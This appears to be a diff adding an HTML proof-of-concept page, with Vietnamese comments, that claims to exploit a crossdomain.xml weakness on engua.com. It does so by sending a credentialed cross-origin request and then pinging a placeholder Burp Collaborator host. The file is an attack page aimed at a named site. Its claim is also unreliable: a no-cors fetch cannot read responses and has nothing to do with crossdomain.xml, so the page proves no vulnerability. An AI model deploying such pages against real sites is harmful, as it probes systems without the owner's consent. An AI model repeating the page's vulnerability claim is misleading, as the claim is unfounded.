@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PoC crossdomain.xml – engua.com</title>
+</head>
+<body>
+  <h2>🚨 PoC crossdomain.xml – engua.com</h2>
+
+  <script>
+    // Gửi request cross-origin đến engua.com để khai thác crossdomain.xml
+    fetch("https://engua.com/", {
+      method: "GET",
+      credentials: "include",
+      mode: "no-cors"  // Đảm bảo request được gửi mà không bị chặn CORS
+    })
+    .then(() => {
+      // Ping về Burp Collaborator/Oastify server để chứng minh request đã được gửi
+      fetch("https://your-collab-id.burpcollaborator.net/?poc=engua-crossdomain&ts=" + Date.now(), {
+        method: "GET",
+        mode: "no-cors"
+      });
+    })
+    .catch(err => console.error("❌ Không thể gửi request:", err));
+  </script>
+</body>
+</html>
